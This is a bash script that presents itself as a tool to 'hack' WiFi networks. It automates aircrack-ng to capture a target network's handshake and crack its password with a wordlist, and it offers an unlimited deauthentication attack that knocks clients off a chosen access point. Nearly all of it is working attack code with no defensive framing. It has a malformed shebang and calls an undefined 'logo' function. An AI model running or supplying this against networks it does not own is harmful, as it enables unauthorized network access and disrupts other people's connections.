#!bin/bash
#A Simple Tool To Hack The Wifi Networks

start () {
echo -e "$(tput setaf 2)Starting Wifi Cracker.."
sleep 0.4
echo "~"
sleep 0.4
echo "~"
sleep 0.4
echo ~$(tput setaf 7)
sleep 0.4
clear
}
choice () {
echo -e "$(tput setaf 3)
        The script only Works if your wifi adapter has monitor mode."
echo -e "\n$(tput setaf 3)                        [ Select Option To Continue ]\n\n"
echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 2)Wifi Hacking"
echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi Deauth"
echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
}
monitor () {
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null" EXIT
airodump-ng wlan0mon
echo
read -p "$(tput setaf 1)Enter the target network BSSID > $(tput setaf 7)" bssid
echo
read -p "$(tput setaf 2)Enter the corresponding Channel > $(tput setaf 7)" ch
}
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
sudo apt-get install aircrack-ng;
fi
logo
choice
while true; do
echo -n "What Is Your Choice >> "
read number
case $number in
  1) clear
logo
start
monitor
x-terminal-emulator -e ./airplay.sh $bssid
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files
aircrack-ng -w dictionary/dictionary.txt files-01.cap
airmon-ng stop wlan0mon > /dev/null
rm files*
logo
choice
    ;;
  2) clear
logo
start
monitor
airodump-ng --bssid $bssid --channel $ch wlan0mon
aireplay-ng -0 0 -a $bssid wlan0mon
    ;;
  3) echo -e "$(tput setaf 1)\n\033[1mThank You for using this tool\n"
     break;
    ;;
  *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
    ;;
esac
done